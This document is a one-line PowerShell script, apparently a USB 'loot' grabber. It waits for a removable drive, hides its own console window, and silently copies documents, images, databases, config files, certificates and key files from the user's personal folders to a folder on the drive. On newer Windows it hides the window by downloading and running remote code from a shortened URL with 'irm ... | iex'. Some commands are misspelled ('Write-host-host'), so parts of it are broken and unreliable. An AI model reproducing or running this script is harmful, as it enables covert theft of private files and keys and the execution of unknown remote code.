Clear-host; $removableDrives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 }; $count = $removableDrives.count; $i = 30; While ($true) { Clear-host; Write-host-host "Connect a Device.. ($i)" -ForegroundColor Yellow; $removableDrives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 }; Start-sleep 1; if (!($count -eq $removableDrives.count)) { Write-host "USB Drive Connected!" -ForegroundColor Green; break }$i--; if ($i -eq 0 ) { Write-host-host "Timeout! Exiting" -ForegroundColor Red; Start-sleep 1; exit } }$drive = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 } | Sort-Object -Descending | Select-Object -First 1; $driveLetter = $drive.DeviceID; Write-host "Loot Drive Set To : $driveLetter/"; $fileExtensions = @("*.log", "*.db", "*.txt", "*.json", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.wpd", "*.rft"); $foldersToSearch = @("$env:USERPROFILE\Documents", "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\OneDrive", "$env:USERPROFILE\Pictures", "$env:USERPROFILE\Videos"); $destinationPath = "$driveLetter\$env:COMPUTERNAME`_Loot"; if (-not (Test-Path -Path $destinationPath)) { New-Item -ItemType Directory -Path $destinationPath -Force; Write-host "New Folder Created : $destinationPath" } Write-host "Hiding the Window.."; Start-sleep 1; $v = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion; $y = $v.Substring(0, 2); if ($y -gt 21) { irm https://is.gd/HidePS  | iex } else { $Import = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'; add-type -name win -member $Import -namespace native; [native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0) }; $driveIndex = 0; foreach ($folder in $foldersToSearch) { Write-host "Searching in $folder"; foreach ($extension in $fileExtensions) { $files = Get-ChildItem -Path $folder -Recurse -Filter $extension -File; foreach ($file in $files) { $driveIndex++; if ($driveIndex -gt 30) { $drive = Get-Volume -DriveLetter $driveLetter.trimEnd(":"); if ($drive) { $driveIndex = 0 }else { exit } }$destinationFile = Join-Path -Path $destinationPath -ChildPath $file.Name; Copy-Item -Path $file.FullName -Destination $destinationFile -Force } } }